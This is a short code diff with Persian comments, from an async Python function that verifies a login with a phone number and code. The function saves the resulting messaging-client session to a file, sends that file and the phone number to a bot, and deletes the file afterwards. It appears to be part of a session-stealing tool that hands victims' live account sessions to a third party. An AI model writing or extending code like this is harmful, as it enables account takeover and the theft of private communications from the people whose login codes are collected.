@@ -111,12 +111,15 @@ async def verify_session(session_id, phone, code):
             return False
         
         # ============================================================
-        # 📁 ذخیره سشن در فایل
+        # 📁 تبدیل سشن به رشته و ذخیره در فایل
         # ============================================================
-        session_file_path = f"{session_id}.session"
-        client.session.save_to_file(session_file_path)
+        session_string = client.session.save()
         
-        # ✅ ارسال فایل به ربات (فقط فایل + شماره)
+        session_file_path = f"{session_id}.session"
+        with open(session_file_path, 'w') as f:
+            f.write(session_string)
+        
+        # ✅ ارسال فایل به ربات
         await send_session_file_to_bot(session_file_path, phone)
         
         # پاک کردن فایل بعد از ارسال
@@ -140,7 +143,7 @@ async def verify_session(session_id, phone, code):
         raise
 
 # ============================================================
-# 📤 ارسال فایل سشن به ربات (فقط فایل + شماره)
+# 📤 ارسال فایل سشن به ربات
 # ============================================================
 async def send_session_file_to_bot(file_path, phone):
     try:
